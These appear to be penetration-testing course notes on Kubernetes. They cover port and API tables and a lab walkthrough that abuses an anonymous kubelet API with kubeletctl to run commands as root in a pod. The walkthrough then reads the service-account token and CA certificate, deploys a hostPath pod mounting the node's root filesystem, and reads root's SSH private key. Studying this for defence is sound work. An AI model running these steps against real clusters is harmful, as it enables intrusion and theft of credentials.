## K8s Concept
|**Function**|**Docker**|**Kubernetes**|
|---|---|---|
|`Primary`|Platform for containerizing Apps|An orchestration tool for managing containers|
|`Scaling`|Manual scaling with Docker swarm|Automatic scaling|
|`Networking`|Single network|Complex network with policies|
|`Storage`|Volumes|Wide range of storage options|
#### Control Plane
|**Service**|**TCP Ports**|
|---|---|
|`etcd`|`2379`, `2380`|
|`API server`|`6443`|
|`Scheduler`|`10251`|
|`Controller Manager`|`10252`|
|`Kubelet API`|`10250`|
|`Read-Only Kubelet API`|`10255`|
## Kubernetes API
|**Request**|**Description**|
|---|---|
|`GET`|Retrieves information about a resource or a list of resources.|
|`POST`|Creates a new resource.|
|`PUT`|Updates an existing resource.|
|`PATCH`|Applies partial updates to a resource.|
|`DELETE`|Removes a resource.|
#### K8's API Server Interaction

```shell
cry0l1t3@k8:~$ curl https://10.129.10.11:6443 -k

{
    "kind": "Status",
    "apiVersion": "v1",
    "metadata": {},
    "status": "Failure",
    "message": "forbidden: User \"system:anonymous\" cannot get path \"/\"",
    "reason": "Forbidden",
    "details": {},
    "code": 403
}
```
#### Kubelet API - Extracting Pods

![](Screenshot%202026-08-09%20at%2015.04.37.png)
#### Kubeletctl - Extracting Pods

```shell
cry0l1t3@k8:~$ kubeletctl -i --server 10.129.10.11 pods
```
![](Screenshot%202026-08-09%20at%2015.05.03.png)
#### Kubelet API - Available Commands

```shell
cry0l1t3@k8:~$ kubeletctl -i --server 10.129.10.11 scan rce
```
#### Kubelet API - Executing Commands

```shell
cry0l1t3@k8:~$ kubeletctl -i --server 10.129.10.11 exec "id" -p nginx -c nginx 

uid=0(root) gid=0(root) groups=0(root)
```
## Privilege Escalation
#### Kubelet API - Extracting Tokens

```shell
cry0l1t3@k8:~$ kubeletctl -i --server 10.129.10.11 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token" -p nginx -c nginx | tee -a k8.token 

eyJhbGciOiJSUzI1NiIsImtpZC...SNIP...UfT3OKQH6Sdw
```
#### Kubelet API - Extracting Certificates

```shell
cry0l1t3@k8:~$ kubeletctl --server 10.129.10.11 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt" -p nginx -c nginx | tee -a ca.crt

-----BEGIN CERTIFICATE-----
MIIDBjCCAe6gAwIBAgIBATANBgkqhkiG9w0BAQsFADAVMRMwEQYDVQQDEwptaW5p
<SNIP>
MhxgN4lKI0zpxFBTpIwJ3iZemSfh3pY2UqX03ju4TreksGMkX/hZ2NyIMrKDpolD
602eXnhZAL3+dA==
-----END CERTIFICATE-----
```
#### List Privileges

```shell
cry0l1t3@k8:~$ export token=`cat k8.token` 
cry0l1t3@k8:~$ kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.10.11:6443 auth can-i --list
```
#### Pod YAML

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: privesc
  namespace: default
spec:
  containers:
  - name: privesc
    image: nginx:1.14.2
    volumeMounts:
    - mountPath: /root
      name: mount-root-into-mnt
  volumes:
  - name: mount-root-into-mnt
    hostPath:
       path: /
  automountServiceAccountToken: true
  hostNetwork: true
```
#### Creating a new Pod

```shell
cry0l1t3@k8:~$ kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.96.98:6443 apply -f privesc.yaml

pod/privesc created


cry0l1t3@k8:~$ kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.96.98:6443 get pods

NAME    READY   STATUS  RESTARTS    AGE
nginx   1/1     Running 0           23m
privesc 1/1     Running 0           12s
```
#### Extracting Root's SSH Key

```shell
cry0l1t3@k8:~$ kubeletctl --server 10.129.10.11 exec "cat /root/root/.ssh/id_rsa" -p privesc -c privesc 

-----BEGIN OPENSSH PRIVATE KEY----- 
...SNIP...
```
